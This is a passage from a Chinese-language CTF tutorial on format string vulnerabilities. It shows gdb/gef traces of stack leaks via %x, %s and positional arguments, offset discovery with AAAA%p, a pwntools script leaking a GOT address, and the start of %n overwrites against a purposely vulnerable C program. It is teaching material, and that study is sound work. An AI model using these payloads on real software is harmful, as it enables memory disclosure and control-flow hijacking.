0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x18: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%3$x<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%3$x&quot;) at printf.c:28<br>28	in printf.c<br>─────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>─────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;%3$x&quot;	 ← $eax<br>0xffffcd14│+0x18: 0xffffce00  →  0x00000001<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br>f7e8b6bb[Inferior 1 (process 57442) exited normally]<br></code></pre></td></tr></table></figure>

<p>可以看出，我们确实获得了printf的第4个参数所对应的值f7e8b6bb。</p>
<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到%s了。这里还是使用上面的程序，进行gdb调试，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ gdb leakmemory<br>gef➤  b printf<br>Breakpoint 1 at 0x8048330<br>gef➤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">s</span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: 没有那个文件或目录.<br>────────────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccec│+0x00: 0x080484bf  →  &lt;main+84&gt; add esp, 0x20	 ← $esp<br>0xffffccf0│+0x04: 0x08048563  →  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4│+0x08: 0x00000001<br>0xffffccf8│+0x0c: 0x22222222<br>0xffffccfc│+0x10: 0xffffffff<br>0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x1c: 0x000000c2<br>gef➤  c<br>Continuing.<br>00000001.22222222.ffffffff.%s<br><br>Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br>gef➤  c<br>Continuing.<br><span class="hljs-meta">%</span><span class="bash">s[Inferior 1 (process 57488) exited normally]</span><br></code></pre></td></tr></table></figure>

<p>可以看出，在第二次执行printf函数的时候，确实是将0xffffcd04处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第printf的第3个参数，如下，此时程序就不能够解析，就崩溃了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">2<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%2$s<br>[1]    57534 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p><strong>小技巧总结</strong></p>
<blockquote>
<ol>
<li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
<li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
<li>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</li>
</ol>
</blockquote>
<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s是main函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%s&quot;) at printf.c:28<br>28	in printf.c<br>──────────────────────────────────────────────────────────[ code:i386 ]────<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>──────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 (&quot;%s&quot;?)<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: 0xff007325 (&quot;%s&quot;?)	 ← $eax<br>0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;<br>0xffffcd18│+0x1c: 0x000000e0<br></code></pre></td></tr></table></figure>

<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffcd10，同时该地址存储的也确实是”%s”格式化字符串内容。</p>
<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定地址addr的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">addr%k$s<br></code></pre></td></tr></table></figure>

<blockquote>
<p>注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节。</p>
</blockquote>
<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[tag]%p%p%p%p%p%p...<br></code></pre></td></tr></table></figure>

<p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">AAAA%</span><span class="bash">p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br>00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p<br><span class="hljs-meta">AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%</span><br></code></pre></td></tr></table></figure>

<p>由0x41414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第5个参数，但是是格式化字符串的第4个参数。我们可以来测试一下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">➜  leakmemory git:(master) ✗ ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">4<span class="hljs-variable">$s</span></span><br>00000001.22222222.ffffffff.%4$s<br>[1]    61439 segmentation fault (core dumped)  ./leakmemory<br></code></pre></td></tr></table></figure>

<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[&#x27;0xffffcd0c&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffcd0c│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd10│+0x04: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd14│+0x08: 0xffffcd20  →  &quot;%4$s&quot;<br>0xffffcd18│+0x0c: 0x000000c2<br>0xffffcd1c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd20│+0x14: &quot;%4$s&quot;	 ← $eax<br>0xffffcd24│+0x18: 0xffffce00  →  0x00000000<br>0xffffcd28│+0x1c: 0x000000e0<br>───────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd20 <span class="hljs-string">&quot;%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>────────────────────────────────────────────────────────────────────────────────<br>gef➤  help x/<br>Examine memory: x/FMT ADDRESS.<br>ADDRESS is an expression for the memory address to examine.<br>FMT is a repeat count followed by a format letter and a size letter.<br>Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),<br>  t(binary), f(float), a(address), i(instruction), c(char), s(string)<br>  and z(hex, zero padded on the left).<br>Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).<br>The specified number of objects of the specified size are printed<br>according to the format.<br><br>Defaults for format and size letters are those previously used.<br>Default count is 1.  Default address is following last thing printed<br>with this command or &quot;print&quot;.<br>gef➤  x/x 0xffffcd20<br>0xffffcd20:	0x73243425<br>gef➤  vmmap<br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br>0x0804b000 0x0806c000 0x00000000 rw- [heap]<br>0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7fb1000 0x00000000 rw-<br>0xf7fd3000 0xf7fd5000 0x00000000 rw-<br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rw-<br>0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so<br>0xffedd000 0xffffe000 0x00000000 rw- [stack]<br>gef➤  x/x 0x73243425<br>0x73243425:	Cannot access memory at address 0x73243425<br></code></pre></td></tr></table></figure>

<p>显然0xffffcd20处所对应的格式化字符串所对应的变量值0x73243425并不能够被改程序访问，所以程序就自然崩溃了。</p>
<p>那么如果我们设置一个可访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p>
<p>首先，获取scanf@got的地址，如下</p>
<blockquote>
<p>这里之所以没有使用printf函数，是因为scanf函数会对0a，0b，0c，00等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gef➤  got<br><br>/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386<br><br>DYNAMIC RELOCATION RECORDS<br>OFFSET   TYPE              VALUE<br>08049ffc R_386_GLOB_DAT    __gmon_start__<br>0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0<br>0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0<br>0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<br></code></pre></td></tr></table></figure>

<p>下面我们利用pwntools构造payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(__isoc99_scanf_got)<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span> payload<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])) <span class="hljs-comment"># remove the first bytes of __isoc99_scanf@got</span><br>sh.interactive()<br><br></code></pre></td></tr></table></figure>

<p>其中，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(记得下断点)，可以看到我们的第四个参数确实指向我们的scanf的地址，这里输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"> → <span class="hljs-number">0xf7615670</span> &lt;printf+<span class="hljs-number">0</span>&gt;       call   <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax&gt;<br>   ↳  <span class="hljs-number">0xf76ebb09</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">0</span>&gt; mov    eax, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb0c</span> &lt;__x86.get_pc_thunk.ax+<span class="hljs-number">3</span>&gt; ret<br>      <span class="hljs-number">0xf76ebb0d</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">0</span>&gt; mov    edx, DWORD PTR [esp]<br>      <span class="hljs-number">0xf76ebb10</span> &lt;__x86.get_pc_thunk.dx+<span class="hljs-number">3</span>&gt; ret<br>───────────────────────────────────────────────────────────────────[ stack ]────<br>[<span class="hljs-string">&#x27;0xffbbf8dc&#x27;</span>, <span class="hljs-string">&#x27;l8&#x27;</span>]<br><span class="hljs-number">8</span><br><span class="hljs-number">0xffbbf8dc</span>│+<span class="hljs-number">0x00</span>: <span class="hljs-number">0x080484ce</span>  →  &lt;main+<span class="hljs-number">99</span>&gt; add esp, <span class="hljs-number">0x10</span>	 ← $esp<br><span class="hljs-number">0xffbbf8e0</span>│+<span class="hljs-number">0x04</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e4</span>│+<span class="hljs-number">0x08</span>: <span class="hljs-number">0xffbbf8f0</span>  →  <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp<br><span class="hljs-number">0xffbbf8e8</span>│+<span class="hljs-number">0x0c</span>: <span class="hljs-number">0x000000c2</span><br><span class="hljs-number">0xffbbf8ec</span>│+<span class="hljs-number">0x10</span>: <span class="hljs-number">0xf765c6bb</span>  →  &lt;handle_intel+<span class="hljs-number">107</span>&gt; add esp, <span class="hljs-number">0x10</span><br><span class="hljs-number">0xffbbf8f0</span>│+<span class="hljs-number">0x14</span>: <span class="hljs-number">0x0804a014</span>  →  <span class="hljs-number">0xf76280c0</span>  →  &lt;__isoc99_scanf+<span class="hljs-number">0</span>&gt; push ebp	 ← $eax<br><span class="hljs-number">0xffbbf8f4</span>│+<span class="hljs-number">0x18</span>: <span class="hljs-string">&quot;%4$s&quot;</span><br><span class="hljs-number">0xffbbf8f8</span>│+<span class="hljs-number">0x1c</span>: <span class="hljs-number">0x00000000</span><br><br></code></pre></td></tr></table></figure>

<p>同时，在我们运行的terminal下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">➜  leakmemory git:(master) ✗ python exploit.py<br>[+] Starting local process <span class="hljs-string">&#x27;./leakmemory&#x27;</span>: pid <span class="hljs-number">65363</span><br>[*] <span class="hljs-string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&#x27;</span><br>    Arch:     i386-<span class="hljs-number">32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (<span class="hljs-number">0x8048000</span>)<br><span class="hljs-number">0x804a014</span><br>\x14\xa0\x80%<span class="hljs-number">4</span>$s<br>[*] running <span class="hljs-keyword">in</span> new terminal: /usr/<span class="hljs-built_in">bin</span>/gdb -q  <span class="hljs-string">&quot;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory&quot;</span> <span class="hljs-number">65363</span><br>[+] Waiting <span class="hljs-keyword">for</span> debugger: Done<br><span class="hljs-number">0xf76280c0</span><br>[*] Switching to interactive mode<br>[*] Process <span class="hljs-string">&#x27;./leakmemory&#x27;</span> stopped <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span> (pid <span class="hljs-number">65363</span>)<br>[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactiv<br></code></pre></td></tr></table></figure>

<p>我们确实得到了scanf的地址。</p>
<p>但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">[padding][addr]<br></code></pre></td></tr></table></figure>

<p>注意</p>
<blockquote>
<p>我们不能直接在命令行输入\x0c\xa0\x04\x08%4$s这是因为虽然前面的确实是printf@got的地址，但是，scanf函数并不会将其识别为对应的字符串，而是会将,x,0,c分别作为一个字符进行读入。下面就是错误的例子。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10	 ← $esp<br>0xffffcd00│+0x04: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd04│+0x08: 0xffffcd10  →  &quot;\x0c\xa0\x04\x08%4$s&quot;<br>0xffffcd08│+0x0c: 0x000000c2<br>0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10│+0x14: &quot;\x0c\xa0\x04\x08%4$s&quot;	 ← $eax<br>0xffffcd14│+0x18: &quot;\xa0\x04\x08%4$s&quot;<br>0xffffcd18│+0x1c: &quot;\x04\x08%4$s&quot;<br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────<br><span class="hljs-meta">[#</span><span class="bash">0] 0xf7e44670 → Name: __printf(format=0xffffcd10 <span class="hljs-string">&quot;\\x0c\\xa0\\x04\\x08%4<span class="hljs-variable">$s</span>&quot;</span>)</span><br><span class="hljs-meta">[#</span><span class="bash">1] 0x80484ce → Name: main()</span><br>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  x/x 0xffffcd10<br>0xffffcd10:	0x6330785c<br></code></pre></td></tr></table></figure>
</blockquote>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢?答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<br></code></pre></td></tr></table></figure>

<p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p>
<p>这里我们给出如下的程序来介绍相应的部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>makefile在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">...[overwrite addr]....%[overwrite offset]$n<br></code></pre></td></tr></table></figure>

<p>其中…表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><h4 id="确定覆盖地址"><a href="#确定覆盖地址" class="headerlink" title="确定覆盖地址"></a>确定覆盖地址</h4><p>首先，我们自然是来想办法知道栈变量c的地址。由于目前几乎上所有的程序都开启了aslr保护，所以栈的地址一直在变，所以我们这里故意输出了c变量的地址。</p>
<h4 id="确定相对偏移"><a href="#确定相对偏移" class="headerlink" title="确定相对偏移"></a>确定相对偏移</h4><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试</p>
